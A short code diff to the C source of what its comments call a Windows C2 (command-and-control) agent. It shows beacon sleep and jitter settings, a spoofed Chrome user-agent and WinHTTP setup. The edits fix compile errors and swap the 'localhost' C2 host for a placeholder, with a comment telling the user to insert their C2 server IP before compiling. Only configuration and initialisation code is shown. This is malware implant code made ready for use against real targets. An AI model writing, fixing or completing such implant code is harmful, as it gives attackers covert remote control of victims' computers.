@@ -9,10 +9,10 @@
 #define DEFAULT_SLEEP_TIME 60
 #define DEFAULT_JITTER 20
 #define MAX_RESPONSE_SIZE 8192
-#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 
 // C2 Server configuration
-#define C2_HOST L"localhost"
+#define C2_HOST L"REPLACE_WITH_IP" // Replace this with your C2 server IP before compiling
 #define C2_PORT 8443
 #define C2_USE_HTTPS FALSE
 #define REGISTER_ENDPOINT L"/register"
@@ -89,7 +89,7 @@ void initialize_agent() {
     srand((unsigned int)time(NULL));
     
     // Initialize WinHTTP
-    HRESULT hr = WinHttpOpen(
+    HINTERNET hr = WinHttpOpen(
         USER_AGENT,
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
